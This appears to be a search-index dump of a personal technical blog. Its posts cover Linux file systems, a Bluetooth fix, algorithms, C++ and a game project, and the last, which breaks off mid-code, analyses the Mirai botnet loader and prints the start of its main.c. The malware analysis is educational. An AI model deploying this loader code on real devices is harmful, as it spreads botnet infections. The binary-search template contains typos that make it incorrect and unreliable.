系统调用首先搜索系统打开文件表,看该文件是否已被其它进程打开了。如果已经打开了,在进程打开文件表里增加一个指针,指向该文件在系统打开文件表里所占用的表项即可。 VFS 系统调用的实现过程:\n文件的打开与关闭\n 用户进程在读/写一个文件之前必须先打开这个文件。所谓打开文件实质上是在进程与文件之间建立连接,而打开文件描述符唯一地标识着这个连接。 应用程序对 open ( )的调用将引起内核调用服务例程 sys_open ( )函数,该函数接收的参数为: 要打开文件的路径名和访问模式等。该系统调用成功后将返回一个文件描述符,也就是文件对象指 针数组的一个索引;系统调用不成功时返回-1。 用户程序通过 close ( )系统调用关闭打开的文件,该函数接收的参数为要关闭文件的文件描述符。内核服务例程为 sys_close ( )函数。  文件的读与写\n 文件的读/写主要是通过系统调用 read ( )和 write ( )完成的,对于读/写文件的进程,目标文件是由一个打开文件描述符代表的。 read ( )和 write ( )的服务例程分别是 sys_read ( )和 sys_write ( )函数。它们都需要三个参数:一个文件描述符 fd;一个包含要传送数据的内存缓冲区地址 buf;一个指定应该传送多少字节数的 count。read ( )把数据从文件传送到缓冲区,而 write ( )执行相反的操作。 两个系统调用都返回所成功传送的字节数,或者发一个错误信号并返回-1。读或写操作总是发生在由当前文件指针所指定的文件偏移量处(文件对象的 f_pos 域)。两个系统调用都通过把所传送的字节数加到文件指针来更新文件指针  ","date":1553508190,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1553508190,"objectID":"17d13121bfec55c93396a05dfa21eceb","permalink":"http://www.guozet.me/post/Linux-Basic-Concepts/","publishdate":"2019-03-25T10:03:10Z","relpermalink":"/post/Linux-Basic-Concepts/","section":"post","summary":"VFS 文件系统 VFS 是一个软件层,用来处理与 Unix/Linux 标准文件系统相关的所有","tags":"Linux","title":"Linux Basic Concepts","type":"post"},{"authors":null,"categories":[["Notes"]],"content":"Introduce [I ran into this issue on my Lenovo P51 running Ubuntu 18.04, and I discovered that the pactl module \u0026ldquo;module-bluetooth-discover\u0026rdquo; was not loading properly at boot time. I fixed the issue by replacing it with \u0026ldquo;module-bluez5-discover\u0026rdquo; in my pulse configuration.\nYou can test this by running:\nsudo pactl unload-module module-bluetooth-discover\nsudo pactl load-module module-bluez5-discover\nAnd try to repair/reconnect your devices. If it works, replicate the following configuration in your /etc/pulse/default.pa config. ]( 4\nI ran into this issue on my Lenovo P51 running Ubuntu 18.04, and I discovered that the pactl module \u0026ldquo;module-bluetooth-discover\u0026rdquo; was not loading properly at boot time. I fixed the issue by replacing it with \u0026ldquo;module-bluez5-discover\u0026rdquo; in my pulse configuration.\nYou can test this by running:\nsudo pactl unload-module module-bluetooth-discover\nsudo pactl load-module module-bluez5-discover\nAnd try to repair/reconnect your devices. If it works, replicate the following configuration in your /etc/pulse/default.pa config.\n# Modify: /etc/pulse/default.pa # Comment out the following line .ifexists module-bluetooth-discover.so load-module module-bluetooth-discover .endif # Replace it with ... .ifexists module-bluez5-discover.so load-module module-bluez5-discover .endif  My suspicion is that this is a change that was made during the switch from Unity to Gnome and the leftover configurations remained, leaving the standard Bluetooth modules behind which don\u0026rsquo;t load correctly.\nAfter switching to bluez5, I have since had no issues, and Bluetooth connects without complaint on my mobile phone, mouse, and headset. :)\nEDIT: I also followed several steps mentioned here: Bluetooth doesn\u0026rsquo;t work after resuming from sleep, Ubuntu 18.04 LTS\nTo exactly replicate my configuration, make sure you apt-get install bluez blueman pulseaudioto have all the same packages. As was suggested in the referenced problem, I believe this was caused by upgrading to 18.04 from 17.04.)\nupdate bluez to \u0026gt;=5.28.2 18.04 ships with a buggy bluez package for now; newer version is available from this PPA: https://launchpad.net/~bluetooth/+archive/ubuntu/bluez:\nsudo add-apt-repository ppa:bluetooth/bluez sudo apt install bluez   workaround for buggy Bluetooth applet (Unity specific?) This is probably the issue @solstice mentioned - BT menu applet doesn\u0026rsquo;t let me enable Bluetooth after resuming from sleep. No matter if the toggle switch is off or on, the BT icon is disabled, and rfkill output doesn\u0026rsquo;t change:\n$ rfkill list 0: phy0: Wireless LAN Soft blocked: no Hard blocked: no 12: hci0: Bluetooth Soft blocked: no Hard blocked: no  You can toggle BT manually by running (substitute your own ID):\nrfkill block 12 rfkill unblock 12  and BT applet should pick it up correctly now. At this point, you should be able to connect to your devices. For now I\u0026rsquo;ve hacked it together using a script that does this automatically after resume:\n$ cat /lib/systemd/system-sleep/bt #!/bin/sh case $1 in post) sleep 5 rfkill block `rfkill list | grep hci | cut -d: -f1` sleep 1 rfkill unblock `rfkill list | grep hci | cut -d: -f1` ;; esac  The ID number next to hci0 in rfkill list output seems to increment after every suspend/resume. Disabling/enabling BT using the BT menu should change the output (\u0026lsquo;soft blocked: yes\u0026rsquo; for BT disabled via menu), but it doesn\u0026rsquo;t. My guess is that the applet remembers the wrong device ID and is thus trying to enable a device that no longer exists.\n","date":1550584525,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1550584525,"objectID":"217e038c5a0ef074c685980a3cb8df4f","permalink":"http://www.guozet.me/post/Linux-Bluetooth-Setting/","publishdate":"2019-02-19T13:55:25Z","relpermalink":"/post/Linux-Bluetooth-Setting/","section":"post","summary":"Introduce [I ran into this issue on my Lenovo P51 running Ubuntu 18.04, and I discovered that the pactl module \u0026ldquo;module-bluetooth-discover\u0026rdquo; was not loading properly at boot time. I fixed the issue by replacing it with \u0026ldquo;module-bluez5-discover\u0026rdquo; in my pulse configuration.","tags":"Node","title":"Linux Bluetooth Setting","type":"post"},{"authors":null,"categories":[["Notes"]],"content":"Hash Table There are four part we need to talk about the Hash-Table: Hash Function, Separate Chaining, Linear Probing and Context\n Hash tables, a data structure that achieves constant-time performance for core symbol table operations, provided that search keys are standard data types or simply defined. Then we consider several fundamental (and useful) examples of symbol-table clients.\n Basic Plan For Hash-Table\nSave items in a key-indexed table (index is a function of the key).\nHash function. Method for computing array index from key.\nHash(\u0026quot;it\u0026quot;) = 3\nThe issues for this part:\n We need to computing the hash function. Equality test: Method for checking whether tow keys are equal. Collision resolution: Algorithm and data structure to handle tow keys that hash to the same array index.  Classic space-time tradeoff.\n No space limitation: Travial hash function with key as index. No time limitation: Travial collision resolution with sequential search. Space and time limitations: Hashing(The real world.)  Hash function  Efficiently computable  ","date":1549800443,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1549800443,"objectID":"16ac1ff444f5634243ea10647066c1b2","permalink":"http://www.guozet.me/post/Algorithm-part-I-Hash-Table/","publishdate":"2019-02-10T12:07:23Z","relpermalink":"/post/Algorithm-part-I-Hash-Table/","section":"post","summary":"Hash Table There are four part we need to talk about the Hash-Table: Hash Function, Separate Chaining, Linear Probing and Context\n Hash tables, a data structure that achieves constant-time performance for core symbol table operations, provided that search keys are standard data types or simply defined.","tags":"Node","title":"Algorithm part I Hash Table","type":"post"},{"authors":["Terry Tang"],"categories":[],"content":"from IPython.core.display import Image Image('https://www.python.org/static/community_logos/python-logo-master-v3-TM-flattened.png')  print(\u0026quot;Welcome to Academic!\u0026quot;)  Welcome to Academic!  Install Python and JupyterLab  Install Anaconda which includes Python 3 and JupyterLab.\nAlternatively, install JupyterLab with pip3 install jupyterlab.\nCreate or upload a Jupyter notebook Run the following commands in your Terminal, substituting \u0026lt;MY-WEBSITE-FOLDER\u0026gt; and \u0026lt;SHORT-POST-TITLE\u0026gt; with the file path to your Academic website folder and a short title for your blog post (use hyphens instead of spaces), respectively:\nmkdir -p \u0026lt;MY-WEBSITE-FOLDER\u0026gt;/content/post/\u0026lt;SHORT-POST-TITLE\u0026gt;/ cd \u0026lt;MY-WEBSITE-FOLDER\u0026gt;/content/post/\u0026lt;SHORT-POST-TITLE\u0026gt;/ jupyter lab index.ipynb  The jupyter command above will launch the JupyterLab editor, allowing us to add Academic metadata and write the content.\nEdit your post metadata The first cell of your Jupter notebook will contain your post metadata ( front matter).\nIn Jupter, choose Markdown as the type of the first cell and wrap your Academic metadata in three dashes, indicating that it is YAML front matter:\n--- title: My post's title date: 2019-09-01 # Put any other Academic metadata here... ---  Edit the metadata of your post, using the documentation as a guide to the available options.\nTo set a featured image, place an image named featured into your post\u0026rsquo;s folder.\nFor other tips, such as using math, see the guide on writing content with Academic.\nConvert notebook to Markdown jupyter nbconvert index.ipynb --to markdown --NbConvertApp.output_files_dir=.  Example This post was created with Jupyter. The orginal files can be found at https://github.com/gcushen/hugo-academic/tree/master/exampleSite/content/post/jupyter\n","date":1549324800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1567641600,"objectID":"6e929dc84ed3ef80467b02e64cd2ed64","permalink":"http://www.guozet.me/post/jupyter/","publishdate":"2019-02-05T00:00:00Z","relpermalink":"/post/jupyter/","section":"post","summary":"Learn how to blog in Academic using Jupyter notebooks","tags":[],"title":"Display Jupyter Notebooks with Academic","type":"post"},{"authors":[],"categories":[],"content":"Create slides in Markdown with Academic  Academic | Documentation\n Features  Efficiently write slides in Markdown 3-in-1: Create, Present, and Publish your slides Supports speaker notes Mobile friendly slides   Controls  Next: Right Arrow or Space Previous: Left Arrow Start: Home Finish: End Overview: Esc Speaker notes: S Fullscreen: F Zoom: Alt + Click  PDF Export: E   Code Highlighting Inline code: variable\nCode block:\nporridge = \u0026quot;blueberry\u0026quot; if porridge == \u0026quot;blueberry\u0026quot;: print(\u0026quot;Eating...\u0026quot;)   Math In-line math: $x + y = z$\nBlock math:\n$$ f\\left( x \\right) = ;\\frac{{2\\left( {x + 4} \\right)\\left( {x - 4} \\right)}}{{\\left( {x + 4} \\right)\\left( {x + 1} \\right)}} $$\n Fragments Make content appear incrementally\n{{% fragment %}} One {{% /fragment %}} {{% fragment %}} **Two** {{% /fragment %}} {{% fragment %}} Three {{% /fragment %}}  Press Space to play!\nOne  Two  Three \n A fragment can accept two optional parameters:\n class: use a custom style (requires definition in custom CSS) weight: sets the order in which a fragment appears   Speaker Notes Add speaker notes to your presentation\n{{% speaker_note %}} - Only the speaker can read these notes - Press `S` key to view {{% /speaker_note %}}  Press the S key to view the speaker notes!\n Only the speaker can read these notes Press S key to view    Themes  black: Black background, white text, blue links (default) white: White background, black text, blue links league: Gray background, white text, blue links beige: Beige background, dark text, brown links sky: Blue background, thin dark text, blue links    night: Black background, thick white text, orange links serif: Cappuccino background, gray text, brown links simple: White background, black text, blue links solarized: Cream-colored background, dark green text, blue links   Custom Slide Customize the slide style and background\n{{\u0026lt; slide background-image=\u0026quot;/img/boards.jpg\u0026quot; \u0026gt;}} {{\u0026lt; slide background-color=\u0026quot;#0000FF\u0026quot; \u0026gt;}} {{\u0026lt; slide class=\u0026quot;my-style\u0026quot; \u0026gt;}}   Custom CSS Example Let\u0026rsquo;s make headers navy colored.\nCreate assets/css/reveal_custom.css with:\n.reveal section h1, .reveal section h2, .reveal section h3 { color: navy; }   Questions?  Ask\n Documentation\n","date":1549324800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1549324800,"objectID":"0e6de1a61aa83269ff13324f3167c1a9","permalink":"http://www.guozet.me/slides/example/","publishdate":"2019-02-05T00:00:00Z","relpermalink":"/slides/example/","section":"slides","summary":"An introduction to using Academic's Slides feature.","tags":[],"title":"Slides","type":"slides"},{"authors":null,"categories":[["Leetcode"]],"content":" All the pictures in this post are coming from the video: 花花酱 LeetCode Binary Search - 刷题找工作 SP5\n Summary The feature for the Binary Search is: Fast, Fast, Fast. O(log(n))\nWhat is Binary Search? The requirment for the Binary Search is the sorted input data.\nEach node needs to make decision go to left or right. For the Binary Search method, the input data will include three partition: Mid, left array, right array.\n If the mid number is less than the target number, then go to right array to find the target number. If the mid number is larger than the target number, then go to left array to find the target number.  When you go to the left or right way, you can choose the recursive function or not recursive function to solve it.\nThe answer for this question is that the last mid point is the target number which you want to find if there is a target number in the array. If there is no target number in the array, when you find the last mid number and then you can return false or use this number to do something.\n Why we need Binary Search. There are some states for the above picture:\n The O(eval) is the time to compare the mid number with the target number and the search space need to move to left part or right part. It may be: O(1), O(n), or O(logn).  SO, you can use the input dataset range to choose which mothod you can use to solve this problem. There are two tips which you can use to think which method is good for you to solve this problem.\n Template Template 1: Unique and sorted elements Include the left data, but not include the right side.\ndef binary_search(1,r): while l \u0026lt; r: m = 1 + (r-1) // 2 if f(m): return m #optional if g(m): r = m else: l + m + 1 return l #or not find, return the min number  As the above picture, if the input element is unique and sorted, then we can easily use this template to deal with these similar problems. Like the example 1.\nIf the Input data\u0026rsquo;s element is not unique. And it have repetitive numbers.\nTemplate 2: Repetitive and sorted elements The lower_bound function will return the first index of i, such that A[i] \u0026gt;= x, So, when you find it, you need to check out if this A[i] may not = x. If the index \u0026gt; len, then there is no number \u0026gt; this.\nExample\nLeetcode 69\nIt is not way to find the real number to fit the requrtment. So, we can find the number the first time bigger than the input.\n","date":1547589124,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1547589124,"objectID":"38e346ac74e6413cd49dd1498b58ff52","permalink":"http://www.guozet.me/post/Algorithms-Binary-Search/","publishdate":"2019-01-15T21:52:04Z","relpermalink":"/post/Algorithms-Binary-Search/","section":"post","summary":"All the pictures in this post are coming from the video: 花花酱 LeetCode Binary Search - 刷题找工作 SP5 Summary The feature for the Binary","tags":"Leetcode","title":"Leetcode Algorithms. Binary Search","type":"post"},{"authors":null,"categories":[["Game"]],"content":"I would like to build a 2D game with the hero game. This game should have these features. (Sprite source: The images which in the asset are all comes from Google image and they all for free.)\n The hero (player) can attack each smart sprite. The smart sprite can attack the hero, and both of them have the attack action. And the smart sprite also needs to avoid the player\u0026rsquo;s attack. Keep score: 1.how fast the hero kills all of the smart sprites. 2.how many drops of blood the hero lost in this game. Conclude: Use the surplus blood and times to calculate.  Source Code: Github\n Project introduce Build a 2-D game engine construction. Use this engine to implement 2D game which has a player object, HUD, collision detection, and explosions features.\n Build a playable game with a player object, HUD, AI, and collision detection. Data-Driven: The game must be data driven so that we can read game constants from an XML file. Object Pool: Use seven design patterns in this project to build this 2-D game. Build HUD with F1 and the HUD should display (1) the fps, and (2) info about how to move the player object   Youtubu Video\n{% youtube X7uQuaB9wNA %}\n Games features There are two main features in this project. The first thing is the AI and Collision Detection. The other thing is the Pool and Projectiles.\nAI and Collision Detection} Build the player Before we do the AI and collision detection, we need to build the player firstly. I just create the player class inherit from the drawable class.\nI have completed seven actions for the player. These actions include idle, walking, jumping, running, jump attacking, attack1, and attack2. After that, the player can control the player to do these activities in the game.\nAI I choice the observed pattern to make the smart sprites to avoid the collision with the player. So as the code in the followed, the player to notify smart sprites of its position. After that, the smart sprite can avoid the player when their distance is less than the setting.\nSo, the smart sprites change the direction if the smart sprites get the notification from the player and calculate their distance between them and player if it less than the set distance. As the picture in the followed. Some pink bird changes the direction before they collide with the player.\nCollision Detection When the distance between the player and the smart sprite is collied, they will be explosive. As the followed picture.\nPool and Projectiles Build pool and projectiles to control the bullet numbers. In addition, I also build a HUD to display the bullet information included the active bullet numbers and the free bullet numbers. This information is on the right side in the picture as followed.\n","date":1547582115,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1547582115,"objectID":"12e90ae8b1d87a4c33a226f4742b845d","permalink":"http://www.guozet.me/post/A-2-D-Shooting-Game/","publishdate":"2019-01-15T19:55:15Z","relpermalink":"/post/A-2-D-Shooting-Game/","section":"post","summary":"I would like to build a 2D game with the hero game. This game should have these features. (Sprite source: The images which in the asset are all comes from Google image and they all for free.","tags":"Game","title":"A 2-D Shooting Game","type":"post"},{"authors":null,"categories":[["Notes"]],"content":" Amortized Analysis: Adding Things in Smart ways.\n Lots of analyses get easier when you add things together after re-grouping them in smart ways.\nIntroduce Example: Think about an Algorithm from the Perspective of a Data Element\u0026hellip; Example: Merge Sort\nIt takes Θ(n) time to merge two sorted lists of conbined length n.\nThink about the runtime level by level. Each level, the runtime is O(n). Each element have one time to merge.\nIf I am is one element, one element runtime is the O(logn).\nHow much of work in the function for one element.\n  Figure out how much work / running times is spent on a single generic element of data during the course of the algorithm.\n  Add this up to get the total running time. (Compared to adding up the time spent on each \u0026ldquo;operation\u0026rdquo;, summed over each operation in chronological order)\n  Example: Enumerating Subsets counter = 0\nFor all subsets S ⊆ {1, 2, 3, 4 ... n}, increment counter.  What is the value of counter at the end of execution?\n Counter = n*n\n Just two steps for each element, in the subset or not in the subset.\nThink about the next one:\nFor all subsets S ⊆ {1, 2, 3, 4 ... n}, For all subsets T ⊆ S Increment Counter  Now, what is the value of counter at the end of execution?\nIf you thinking about the each subset, this is a confused way because some subsets are big and others are small. By this question, we can thing about the element by data.\nSo, each element can be in three ways: In S but not T, In S and T, not in S and T.\n Counter: n * n * n\n Example: Domination Radius  Given the heights of N individuals standing in a line. Goal: Find the domination radius of each individual.  In this problem, each one will expand both left and right sides. Then, this solution need n expand time in the code. However, we want the solve this question in O(nlog n)\nSolution 1: Simple algorithm: from each element, scan left until blocked, then scan right until blocked.\n Running times: O($n^2$) worst-case\n There is an issue with this solution, if the element have been sorted and you go to the wrong way firstly, then you will get into trouble.\nSolution 2: Refinement- From each element, scan left and right simultaneously until blocked.\n Running times: O($n^2$) worst-case\n For each element in this array, they may have different worst time. The tallest one have the different worst time with the shortest one. The very tall people may spend a lot of works. and the lower one may only spend a few works. So, how we can get the worst-time for this solution, different element have the different worst-time in this case. Their behaivir is totoally different.\nHigh-Work: Scan $\\geq$ D, So, total: O($ \\frac{n}{D}*n $ )\nLow-Work: Scan $\\leq$ D (the work per element), So,total: O(n*D)\nn is the # of the number of element in the array, so the worst work for each element is n. And How many elements for the high works: n/D because if the D is the each high-work element\u0026rsquo;s interval. If the interval is less than D, then the scan \u0026gt; D is error. THe number of high element is n/D\nFrom the above, the total running times: O($\\frac{n^2}{D} + nD$), in this case, if we choose the D is with small, the first value will be very big. However, if we choose the D is very big, the second value will be very big even though the first value change to the small value. What is the best way we can get the best running times?\nWhen the $D = \\sqrt{n}$, we can get the best running times: O($n^{1.5} + n^{1.5}$) = O($2*n^{1.5}$)\nIn this case, if we have a sorted array:\nThe running times is:\n$1 + 2 + 3 + \u0026hellip; + n = \\frac{n(n+1)}{2} = \\Theta(n^2)$\nNow, let\u0026rsquo;s us to thing about how to build these element more than three groups.\n   Work/Element Range Max Number of Element Total     First Group [n/2, n) 2 of them O(n)   Second Group [n/4, n/2) 4 of them O(n)   Third Group [n/8, n/4) 8 of them O(n)   \u0026hellip; \u0026hellip; \u0026hellip; \u0026hellip;     So, in this case, we get the total times: O(nlog n)\n Re-Sizing Memory Blocks There are some questions for the Re-Sizing Memory Blocks:\n Since Memory blocks often cannot expand after allocation, what do we do when a memory block fills up? For example, suppose we allocate 100 words of memory space for a stack (implemented as an array), but then realize we have more than 100 elements to push onto the stack!   Of course, if we use a linked list would have solved this problem, but suppose we really want to use arrays instead\u0026hellip;)\n Some exixt solution for this problem\n A common technique for block expansion: Whenever our current block fills up, allocate a new block of twice its size and transfer the contents to the new block. Unforturnaely, now some of our push operations will be quite slow!  Most push operations take only O(1) time. However, a push operation resulting in an expansion (and a copy of the n elements currently in the stack) will take $\\Theta$(n) times.    So, what is the runtimes for the push.(It is hard to say.)\nPush has a somewhat not-uniform running time profile:\n O(1) almost always Except $\\Theta$(N) every now and then.  But just saying the running time is \u0026ldquo;$\\Theta$(N) in the worst case\u0026rdquo; doesn\u0026rsquo;t tell the whole story..\n Doesn\u0026rsquo;t do the structure justive. People might be scared to use it for large input sizes\u0026hellip;  Most times, it is so fast. So, for these case, we need a new way to descript this case, it\u0026rsquo;s bad to misunderstanding for the only past descript.\nHow much does each push actually cost? If we insert the element in the stack(array) And, what about if we charge ourselves 3 units of work per operation instead\u0026hellip;?\nTrue cumulative cost after any sequence of k operations is upper bounded by fictitious cumulative cost of 3k\u0026hellip;\nAnd, if we change something:\nSo, how different is our version of push from a version that takes 3 units in the worst case?\nAmortized Analysis Any sequence of k pushes takes O(k) worst-case time, so we say that push takes O(1) amortized time.\nOn average, over the entire sequence, each individual push therefore takes O(1) time.\nIn general, an operation runs in O(f(n)) amortized time if any sequence of k such operations runs in O(k * f(n)) time.\nThe motivation for the Amortized Analysis Amortized analysis is an ideal way to characterize the worst-case running time of operations with highly non-uniform performance.\nIt is still worst-case analysis, just averaged over an arbitrary sequence of operations. And, it gives us a much clearer picture of the true performance of a data structure that more faithfully describes the true performance. (For example, $\\Theta(N)$ worst case vs. O(1) amortized.)\nExample\nSuppose we have 2 implementations of a data structure to choose from:\n O(log n) worst-case time / operation O(log n) amortized time / operation   There is no difference if we use either A or B as part of a larger algorithm. For example, if our algorithm makes n calls to the data structure, the running time is O(n log n) in either case.\n The choice between A and B only matters in a \u0026ldquo;real-time\u0026rdquo; setting when the response time of an individual operation is important.\nIf the dataset is not big, you want to as fast as they can. Then choose the first one.\nGeneralizing to Multiple operations We say an operation A requires O(f(n)) amortized time if any sequence of k invocations of A requires O(k f(n)) time in the worst case.\nWe say operations A and B have amortized running times of O($f_A(n)$) and O($f_B(n)$) if any sequence containing $K_A$ invocations of A and $K_B$ invocations of B requires: $O(K_A f_A(n) + K_B f_B(n))$. And so on, for 3 or more operations\u0026hellip;\nA simple, but often limited, method for Amortized analysis Compute the worst-case running time for an arbitrary sequence of k operations, then divide by k. Unfortunately, it is often hard to bound the running time of an arbitrary sequence of k operations.(Especially if the operations are of several types \u0026ndash; for example, \u0026ldquo;push\u0026rdquo; and \u0026ldquo;pop\u0026rdquo;)\u0026hellip;\n Accounting Method Analysis Example Using Memory Re-Sizing\nCharge 3 units (i.e., O(1) amortized time) for each push operation.\n 1 unit for the immediate push. \u0026ldquo;$2\u0026rdquo; credit for future memory expansions.  You charged upfront and use it later. Ans the dataset is not changed. Just make this quesiton like you pay for the car fees which we talked before.\nThere are the same thing, pay for the cost which you may be used in the future. The data you need pay for is not changed, just make each step siilar.\nWhat about adding \u0026ldquo;Pop\u0026rdquo; - Will this work well? When the buffer fills up due to too many pushes, double its size. And when the buffer becomes less than half full due to too many pops, halve its size. We want think about how to make the most space in the buffer are effective.\n If we use the half of the buffer as the line to detect double its size or half its size, this buffer may double and half frequently if these data size close with the half of buffer size.\n Change to When the buffer becomes less than one quarter full due to too many pops, halve its size. When the buffer fills up due to too many pushes, double its size.\nExample: The Min-Queue Using either a linked list or a (circular) array, it is easy to implement a FIFO queue supporting the insert and delete operations both in O(1) worst-case time.\nSuppose that we also want to support a find-min-operation, which returns the value of the minimum element currently present in the queue.It is possible to implement a \u0026ldquo;min-queue\u0026rdquo; supporting insert, delete, and find-min all in O(1) worst-case time?\nIf we use a new structure about the Min-Queue as a Pair of \u0026ldquo;Back-to-Back\u0026rdquo; Min-Stacks.\nWe insert the data at the blue side, and delete the element at the yellow side. And, what will waste a lot of time in this case?\n When yellow stack becomes empty, spend O(n) time and transfer the contents of blue stack into the yellow stacks. Just like the blue stack pop and the yellow stack push the element in the stack.\n ","date":1547563640,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1547563640,"objectID":"447d1fcdd6a647473986d252ab25e4d9","permalink":"http://www.guozet.me/post/Algorim-Lecture-2/","publishdate":"2019-01-15T14:47:20Z","relpermalink":"/post/Algorim-Lecture-2/","section":"post","summary":"Amortized Analysis: Adding Things in Smart ways.\n Lots of analyses get easier when you add things together after re-grouping them in smart ways.\nIntroduce Example: Think about an Algorithm from the Perspective of a Data Element\u0026hellip; Example: Merge Sort","tags":"Node","title":"Algorim Lecture 2-Amortized Analysis","type":"post"},{"authors":null,"categories":"C++","content":"Question 现在有两个类A和B需要定义，定义A的时候需要用到B，定义B的时候需要用到A。\n//A.h #include \u0026quot;B.h\u0026quot; class A { B b; };  //B.h #include \u0026quot;A.h\u0026quot; class B { A a; };   Analyze A和B的定义和调用都放在一个文件中肯定是不可以的，这样就会造成两个循环调用的死循环。\n根本原因是：定义A的时候，A的里面有B，所以就需要去查看B的占空间大小，但是查看的时候又发现需要知道A的占空间大小，造成死循环。\n Solution  写两个头文件A.h和B.h分别用于声明类A和B； 写两个.cpp文件分别用于定义类A和B； 在A的头文件中导入B的头文件； 在B的头文件中不导入A的头文件，但是用extern 的方式声明类A，并且，在B中使用A的时候要用指针的形式。  原理：在B中用指针调用A，那么在A需要知道B占空间大小的时候，就会去找到B的定义文件，虽然B的定义文件中并没有导入A的头文件，不知道A的占空间大小，但是由于在B中调用A的时候用的指针形式，B只知道指针占4个字节就可以，不需要知道A真正占空间大小，也就是说，A也是知道B的占空间大小的。\n参考博客：\n  C++ 两个类头文件互相引用  C++中两个类互相引用的解决方法   ","date":1543313671,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1543313671,"objectID":"7147e6489f48e5c532d070f538418ecf","permalink":"http://www.guozet.me/post/C++-Two-Class-include-other-one/","publishdate":"2018-11-27T10:14:31Z","relpermalink":"/post/C++-Two-Class-include-other-one/","section":"post","summary":"Question 现在有两个类A和B需要定义，定义A的时候需要用到B，定义B","tags":"C++","title":"C++中两个类相互引用的情况","type":"post"},{"authors":null,"categories":"Interview","content":"Question You are given a Stack data structure that supports standard push and pop operations. You need to implement Queue data structure using one Stack instances.\nPicture From: Implement Queue using One Stack in Java (Recursive Implementation)\n Analyze 实现队列，有这样两个函数操作：\nenQueue() 压栈操作:\n Push the element to the Stack.  deQueue() 出栈操作:\n Pop all the elements from Main Stack recursively until Stack item count is equal to 1. If Stack item count = 1, Pop item from Stack, Print it \u0026amp; Return.  Push all popped element back to Stack as shown below.  Solution // Implementing queue using a single stack #include \u0026lt;stdio.h\u0026gt; #define SIZE 10 int stack[10]; int top = -1; int pop() { if (top != -1) return stack[top--]; } void push(int data) { if (top \u0026lt; SIZE) stack[++top] = data; } void enqueue(int data) { push(data); } // 使用递归实现出栈操作 int dequeue() { if (top == 0) return pop(); int data = pop(); int value = dequeue(); push(data); return value; } int main(void) { int i; // Enqueue enqueue(1); enqueue(2); enqueue(3); enqueue(4); for (i = 0; i \u0026lt;= top; i++) printf(\u0026quot;%d \u0026quot;, stack[i]); printf(\u0026quot;\\n\u0026quot;); // Dequeue printf(\u0026quot;Dequeue --\u0026gt; %d\\n\u0026quot;, dequeue()); printf(\u0026quot;Dequeue --\u0026gt; %d\\n\u0026quot;, dequeue()); for (i = 0; i \u0026lt;= top; i++) printf(\u0026quot;%d \u0026quot;, stack[i]); printf(\u0026quot;\\n\u0026quot;); return 0; }  ","date":1542694171,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1542694171,"objectID":"c4e3a7673ae90acbdab3c15536d1f241","permalink":"http://www.guozet.me/post/Interview-Implement-Queue-By-Stack/","publishdate":"2018-11-20T06:09:31Z","relpermalink":"/post/Interview-Implement-Queue-By-Stack/","section":"post","summary":"Question You are given a Stack data structure that supports standard push and pop operations. You need to implement Queue data structure using one Stack instances. Picture From: Implement Queue","tags":"Interview","title":"面试题：使用一个stack实现Queue","type":"post"},{"authors":null,"categories":"Network","content":"前言  The Mirai internet of things (IoT) botnet is infamous for targeting connected household consumer products. It attaches itself to cameras, alarm systems and personal routers, and spreads quickly. The damage can be quite substantial. People might not realize that their internet-enabled webcam was actually responsible for attacking Netflix. Cite: How to Identify a Mirai-Style DDoS Attack\n Mirai IoT 僵尸网络可以连接到家居的用户级的IoT设备，它可以将自己安装到摄像头，警报器以及个人的路由器里面，并且能够非常快的扩散出去，造成很大的破坏力。\n 主要工作流程  Preparing the Attack Deploying the Malware Repeating the Attack  在这一篇博客里，主要对Deploying the Malware的流程的源代码进行详细的分析，希望能够在源代码阅读中，更加清晰地了解Mirai的入侵流程。\n 部署Malware的流程 在这部分主要分析，Mirai Malware 是怎么部署到IoT设备上面的，也就是整个入侵的过程，这个过程是基于其他的Bot已经发现了登录到这个系统的帐号之后。入侵过程分为下面三个部分：\n Scan success identified Loader receives data Loader pushes malware  Malware 的源代码在 Master端通过交叉编译的方式使其能够支持一系列的体系架构，在Mater端的Loader代码试图确定即将感染的Bot的硬件体系架构，然后再Push最合适的可执行程序过去。然后，在可执行文件运行的情况下，该设备现在是僵尸网络的成员，并开始执行与僵尸网络中任何其他节点相同的扫描和攻击活动。\n文件目录介绍：\n左上方显示的目录是Loader根目录，里面包含了两个文件夹：bin和src，两个文件夹分别包含了：\n bin文件夹： 包含了dlr.arm， dlr.arm7， dlr.m68k， dlr.mips， dlr.mpsl, dlr.ppc,dlr.sh4, dlr.spc, dlr.x86不同体系架构上面的可执行代码. src文件夹：  main.c Loader执行过程的核心程序 connection.c server.c telnet_info.c util.c 工具文件, 提供给其他部分可以调用的四个函数工具 server.c    源代码分析 首先对main函数进行分析，因为整个文件不算太长，所以就将其源代码全部放在这里进行分析。\n#include \u0026lt;errno.h\u0026gt; #include \u0026lt;pthread.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;sys/socket.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026quot;headers/binary.h\u0026quot; #include \u0026quot;headers/includes.h\u0026quot; #include \u0026quot;headers/server.h\u0026quot; #include \u0026quot;headers/telnet_info.h\u0026quot; #include \u0026quot;headers/util.h\u0026quot; static void *stats_thread(void *); static struct server *srv; //重要全局变量 char *id_tag = \u0026quot;telnet\u0026quot;; int main(int argc, char **args) { pthread_t stats_thrd; uint8_t addrs_len; ipv4_t *addrs; uint32_t total = 0; struct telnet_info info; addrs_len = 2; addrs = calloc(addrs_len, sizeof(ipv4_t)); addrs[0] = inet_addr(\u0026quot;192.168.0.1\u0026quot;); // Address to bind to addrs[1] = inet_addr(\u0026quot;192.168.1.1\u0026quot;); // Address to bind to if (argc == 2) { id_tag = args[1]; } if (!binary_init()) { printf(\u0026quot;Failed to load bins/dlr.* as dropper\\n\u0026quot;); return 1; } if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs, 1024 * 64, \u0026quot;100.200.100.100\u0026quot;, 80, 